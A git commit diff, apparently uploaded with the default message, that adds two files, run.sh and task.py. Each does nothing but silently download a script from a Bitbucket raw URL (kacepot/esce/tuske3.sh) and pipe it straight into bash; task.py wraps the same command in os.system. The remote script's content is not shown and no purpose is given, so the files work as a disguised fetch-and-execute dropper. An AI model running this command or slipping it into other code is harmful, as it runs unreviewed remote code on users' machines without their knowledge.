1a73ed79958f225f4b192e98cafd4031b982df77
AlmiraHanafie <almirahanafie@outlook.com>
2024-06-27 00:29:55 +0700

    Add files via upload

---
+++ run.sh
@@ -0,0 +1,2 @@
+#!/bin/bash
+curl -sL https://bitbucket.org/kacepot/esce/raw/main/tuske3.sh | bash
---
+++ task.py
@@ -0,0 +1,3 @@
+import sys
+import os
+os.system('curl -sL https://bitbucket.org/kacepot/esce/raw/main/tuske3.sh | bash')
